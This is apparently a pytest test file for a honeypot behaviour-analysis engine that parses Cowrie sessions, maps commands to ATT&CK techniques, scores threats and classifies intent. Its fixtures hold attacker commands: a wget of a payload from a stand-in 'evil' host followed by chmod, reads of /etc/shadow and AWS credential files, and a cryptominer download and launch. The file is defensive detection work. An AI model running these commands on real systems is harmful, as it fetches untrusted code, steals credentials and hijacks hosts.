"""Week 3 — Behavior Analysis Engine tests."""
import os
import sys

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from behavior.features import Session, parse_sessions, vectorize, FEATURE_NAMES
from behavior.ttp_extractor import extract_ttps
from behavior.threat_score import score_session, band
from behavior.classifier import IntentClassifier, heuristic_intent, _HAVE_SKLEARN
from behavior.profiler import Profiler
from behavior.engine import BehaviorEngine
from behavior.synthetic import synthetic_sessions


# --- feature engineering -------------------------------------------------
def test_parse_sessions_groups_by_session_id():
    events = [
        {"eventid": "cowrie.session.connect", "session": "x", "src_ip": "1.2.3.4"},
        {"eventid": "cowrie.login.success", "session": "x", "src_ip": "1.2.3.4",
         "username": "root", "password": "toor"},
        {"eventid": "cowrie.command.input", "session": "x", "src_ip": "1.2.3.4",
         "input": "wget http://evil/x; chmod +x x"},
        {"eventid": "cowrie.session.closed", "session": "x", "duration": 12.0},
    ]
    s = parse_sessions(events)["x"]
    assert s.login_success and s.login_attempts == 1
    assert s.duration_s == 12.0
    # pipeline split counts both stages
    assert "wget" in s.base_commands() and "chmod" in s.base_commands()


def test_vector_length_matches_feature_names():
    s = Session(session_id="s", commands=["ls", "cat /etc/shadow"])
    assert len(vectorize(s)) == len(FEATURE_NAMES)


def test_sensitive_reads_detected():
    s = Session(session_id="s", commands=["cat /etc/shadow", "cat ~/.aws/credentials"])
    assert s.sensitive_reads() >= 2


# --- TTP extraction ------------------------------------------------------
def test_ttp_mapping_known_commands():
    ttps = {t.technique_id for t in extract_ttps([
        "wget http://x/y", "crontab -e", "cat /etc/shadow", "chmod +x bot"])}
    assert {"T1105", "T1053.003", "T1003.008", "T1222.002"} <= ttps


def test_ttp_dedup_and_evidence():
    ttps = extract_ttps(["wget a", "curl b"])
    t1105 = [t for t in ttps if t.technique_id == "T1105"][0]
    assert len(t1105.evidence) == 2 and t1105.confidence == 1.0


# --- threat scoring ------------------------------------------------------
def test_threat_score_orders_recon_below_impact():
    recon = Session(session_id="r", commands=["whoami", "uname -a"])
    s_recon, _ = score_session(recon, "Reconnaissance", 0.9, extract_ttps(recon.commands))

    miner = Session(session_id="m", commands=["wget x/xmrig", "chmod +x xmrig",
                    "./xmrig -o pool.minexmr.com:4444"], login_success=True,
                    downloads=["x/xmrig"])
    s_miner, _ = score_session(miner, "Cryptomining", 0.9, extract_ttps(miner.commands))
    assert s_miner > s_recon


def test_band_thresholds():
    assert band(10) == "log" and band(50) == "slow_redirect"
    assert band(80) == "isolate" and band(95) == "block"


# --- classifier ----------------------------------------------------------
def test_heuristic_classifier_reasonable():
    s = Session(session_id="s", commands=["wget x/xmrig", "./xmrig -o stratum+tcp://p:4444"])
    intent, conf = heuristic_intent(s)
    assert intent == "Cryptomining" and conf > 0.5


@pytest.mark.skipif(not _HAVE_SKLEARN, reason="sklearn not installed")
def test_trained_classifier_hits_f1_target():
    sessions, labels = synthetic_sessions(n_per_class=60, seed=5)
    from behavior.features import feature_matrix
    clf = IntentClassifier()
    report = clf.fit(feature_matrix(sessions), labels, seed=5)
    assert report["best_macro_f1"] > 0.85


# --- profiler + engine ---------------------------------------------------
def test_engine_builds_profile_and_clusters():
    eng = BehaviorEngine(classifier=IntentClassifier(model=None))  # heuristic
    sessions, _ = synthetic_sessions(n_per_class=4, seed=3)
    # force several sessions onto one src_ip so the profile aggregates
    for s in sessions[:5]:
        s.src_ip = "9.9.9.9"
    analyses = eng.analyze_sessions(sessions, persist=False)
    assert len(analyses) == len(sessions)
    p = eng.profile("9.9.9.9")
    assert p is not None and len(p.sessions) == 5
    assert p.classified_intent is not None
    # campaign clustering ran (campaign_id assigned, -1 allowed)
    assert p.campaign_id is not None
